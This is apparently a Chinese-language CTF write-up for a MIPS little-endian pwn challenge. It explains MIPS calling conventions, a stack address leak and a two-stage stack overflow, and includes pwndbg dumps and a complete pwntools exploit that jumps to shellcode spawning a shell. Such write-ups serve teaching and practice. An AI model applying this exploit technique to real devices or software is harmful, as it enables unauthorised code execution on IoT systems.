# MIPS 初探

## 0x01 MIPS 相关准备知识

### MIPS 重要特性

- mips本身不支持NX

### MIPS 函数调用约定

- 调用者将参数保存在寄存器 $a0 - $a3 中。其总共能保存4个参数。如果有更多的参数，或者有传值的结构，其将被保存在栈中。
- 调用者使用 jal 加上子程序的标记。返回地址保存在 $ra 中。
- 返回地址是 PC + 4，PC 是 jal 指令的地址。
- 如果被调用者使用框架指针，它通常将其设置为栈指针。旧的栈指针必须在之前被保存到栈中。
- 被调用者通常在开头将其需要使用的寄存器保存到栈中。如果被调用者调用了辅助子程序，必须将 $ra入栈，同时也必须将临时寄存器或被保留的寄存器入栈。
- 当子程序结束，返回值要保存在 $v0 - $v1 中。
- 被调用者使用 jr $ra 返回到调用者那里。

Ref:https://www.jianshu.com/p/79895392ecb2
### MIPS 寄存器
|寄存器编号 | 别名    | 用途                                                          |
| ------- | ------- | ------------------------------------------------------------ |
| $0      | $zero   | 常量0(constant value 0)                                      |
| $1      | $at     | 保留给汇编器(Reserved for assembler)                         |
| $2-$3   | $v0-$v1 | 函数调用返回值(values for results and expression evaluation) |
| $4-$7   | $a0-$a3 | 函数调用参数(arguments)                                      |
| $8-$15  | $t0-$t7 | 暂时的(或随便用的)                                           |
| $16-$23 | $s0-$s7 | 保存的(或如果用，需要SAVE/RESTORE的)(saved)                   |
| $24-$25 | $t8-$t9 | 暂时的(或随便用的)                                           |
| $28     | $gp     | 全局指针(Global Pointer)                                    |
| $29     | $sp     | 堆栈指针(Stack Pointer)                                     |
| $30     | $fp/$s8 | 栈帧指针(Frame Pointer)                                     |
| $31     | $ra     | 返回地址(return address)                                    |

### MIPS 汇编

- [mips_arm汇编学习](https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi)

## 0x02 题目
>题目来源： HWS夏令营入营赛题

- file : [Mplogin.zip](./Mplogin.zip)

运行：`qemu-mipsel -L ./ Mplogin `  因为是小端所以用mipsel

## PWN

### 保护措施
```
pwn checksec ./Mplogin 
[*] '/home/iot/my/pwn-exercise/linux_mips_stack/mips_pwn_Mplogin/Mplogin/Mplogin'
    Arch:     mips-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

逆向分析主要是两个函数，通过运行也可以知道，有3个输入点。     



### main
主要有2个函数`sub_400840()`和`sub_400978(v5)`
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // $a2
  int v5; // [sp+18h] [+18h]

  setbuf(stdin, 0, envp);
  setbuf(stdout, 0, v3);
  printf("\x1B[33m");
  puts("-----we1c0me t0 MP l0g1n s7stem-----");
  v5 = sub_400840();
  sub_400978(v5);
  printf("\x1B[32m");
  return puts("Now you getshell~");
}
```

### 栈地址泄露

` sub_400840`函数读取数据到v1但是未验证最后一位字符，如果输入一个24字节并且前5字节是admin的字符串，当再次printf时候就会打印泄露数据。  
`qemu-mipsel -g 1234  -L ./ Mplogin  | hexdump -C` 可以通过hexdump查看返回的hex。      
```
int sub_400840()
{
  char v1[24]; // [sp+18h] [+18h] BYREF

  memset(v1, 0, sizeof(v1));
  printf("\x1B[34m");
  printf("Username : ");
  read(0, v1, 24);
  if ( strncmp(v1, "admin", 5) )
    exit(0);
  printf("Correct name : %s", v1);
  return strlen(v1);
}
```
通过调试我们可以发现泄漏的数据为 `70 f2 ff 76`，因为是小端，泄漏的地址为`0x76fff270`正好是栈空间的地址，后续调试要分析，该地址数据是否可控？     




### 栈溢出
通过逆向我们可以看出，v2,v3参数存在栈溢出，但是v2只能溢出16字节，但是却影响了v3的值，而v3又是v4输入长度的大小，所以思路如下：
1. 第一次输入v2，溢出，控制v3的大小，为了保证正常ret，需要过判断前6字节为access。      
2. 第二次输入v4，长度为v3的大小，进而溢出ret，为了保证正常ret，需要过判断前10字节为0123456789。  
3. 探明泄露栈地址位置，进而ret到相对位置执行shellcode。    
如果通过ida逆向分析，有栈空间相对位置可以计算出，v2与v3差0x2c-0x18=0x14，也就是说v2输入0x14 + p32(v3长度大小)    
```
int __fastcall sub_400978(int a1)
{
  char v2[20]; // [sp+18h] [+18h] BYREF
  int v3; // [sp+2Ch] [+2Ch]
  char v4[36]; // [sp+3Ch] [+3Ch] BYREF

  v3 = a1 + 4;
  printf("\x1B[31m");
  printf("Pre_Password : ");
  read(0, v2, 36);
  printf("Password : ");
  read(0, v4, v3);
  if ( strncmp(v2, "access", 6) || strncmp(v4, "0123456789", 10) )
    exit(0);
  return puts("Correct password : **********");
}
```
断点位置，第1次read之后（0x004009FC）   
通过调试也可以验证v2与v3的相对位置，正好影响v3（0x0x76fff234）的值为0x100.
```
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ s8 sp 0x76fff208 —▸ 0x76fff238 ◂— 0x0
01:0004│       0x76fff20c —▸ 0x400d70 ◂— andi   $s3, $t1, 0x5b1b
02:0008│       0x76fff210 ◂— 0x5
03:000c│       0x76fff214 ◂— 0x0
04:0010│       0x76fff218 ◂— 0x418e50
05:0014│       0x76fff21c ◂— 0x0
06:0018│ a1    0x76fff220 ◂— 'accessbbbbbbbbbbbbbb'
07:001c│       0x76fff224 ◂— 'ssbbbbbbbbbbbbbb'
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► f 0 0x4009fc
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/16wx 0x76fff220
0x76fff220:     0x65636361      0x62627373      0x62626262      0x62626262
0x76fff230:     0x62626262      0x00000100      0x00000000      0x76fff250
0x76fff240:     0x00400d59      0x00000000      0x00418e50      0x00000000
0x76fff250:     0x696d6461      0x6161616e      0x61616161      0x61616161
```
断点位置，第2次read之后（0x00400A3c）    
通过之前泄露的值可以判断，v4的输入可控制，与泄露地址的相对位置为0x76fff270-0x76fff244=0x2c，可以将shellcode写入v4+0x2c 的位置。   
```
──────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ s8 sp 0x76fff208 —▸ 0x76fff238 ◂— 0x0
01:0004│       0x76fff20c —▸ 0x76fff220 ◂— 'accessbbbbbbbbbbbbbb'
02:0008│       0x76fff210 ◂— 0x24 /* '$' */
03:000c│       0x76fff214 ◂— 0x0
04:0010│       0x76fff218 ◂— 0x418e50
05:0014│       0x76fff21c ◂— 0x0
06:0018│       0x76fff220 ◂— 'accessbbbbbbbbbbbbbb'
07:001c│       0x76fff224 ◂— 'ssbbbbbbbbbbbbbb'
────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► f 0 0x400a3c
──────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/32wx 0x76fff220
0x76fff220:     0x65636361      0x62627373      0x62626262      0x62626262
0x76fff230:     0x62626262      0x00000100      0x00000000      0x76fff250
0x76fff240:     0x00400d59      0x33323130      0x37363534      0x63633938
0x76fff250:     0x63636363      0x63636363      0x63636363      0x63636363
0x76fff260:     0x63636363      0x63636363      0x63636363      0x63636363
0x76fff270:     0x63636363      0x63636363      0x63636363      0x63636363
```

最后就是通知ra 返回到泄露的栈地址空间，进而执行shellcode。   
可以用pwntools cyclic的方式，主要替换前10字节为0123456789。         

判断相对位置为 0x28。   

```
>>> from pwn import *
>>> cyclic(0x100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac'
>>> cyclic_find('kaaa')
40
>>> hex(40)
'0x28'
```
调试断点位置：    
.text:0x00400AE4 08 00 E0 03 jr      $ra
```
Program received signal SIGSEGV, Segmentation fault.
0x6161616b in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────
 V0   0x1e
 V1   0x1
 A0   0x767cd144 ◂— 0x0
 A1   0x76fff1c0 —▸ 0x767d530a ◂— 0x0
 A2   0x1
 A3   0x0
 T0   0x76fff0e0 ◂— 0x0
 T1   0x7ab92be
 T2   0x0
 T3   0x0
 T4   0x767e6070 ◂— 0x0
 T5   0x1
 T6   0xfffffff
 T7   0x400567 ◂— 'strlen'
 T8   0x18
 T9   0x76743000 ◂— 0x3c1c0009 /* '\t' */
 S0   0x76806010 ◂— 0x0
 S1   0x4005d8 ◂— lui    $gp, 2
 S2   0x0
 S3   0x0
 S4   0x0
 S5   0x0
 S6   0x0
 S7   0x0
 S8   0x6161616a ('jaaa')
 FP   0x76fff270 ◂— 0x6161616c ('laaa')
 SP   0x76fff270 ◂— 0x6161616c ('laaa')
 PC   0x6161616b ('kaaa')
```

## EXP

- [exp.py](./Mplogin/exp.py)

```python
from pwn import *

context(arch='mips', endian='little',log_level='debug')

io = process(['qemu-mipsel','-L','./','./Mplogin'])
#io = process(['qemu-mipsel','-g','1234','-L','./','./Mplogin'])

# leak stack addr
payload1 = b'admin'.ljust(24,b'a')
io.sendafter("name : ",payload1 )
io.recvuntil("Correct name : ")
io.recv(24)
stack_addr = u32(io.recv(4))

payload2 = b'access'.ljust(0x14,b'b') +p32(0x100)
io.sendafter('Pre_Password : ',payload2)

payload3 = b"0123456789".ljust(0x28,b"c")+p32(stack_addr)+asm(shellcraft.sh())
io.sendafter('Password : ',payload3)
io.interactive()
```
## Ref

- https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/
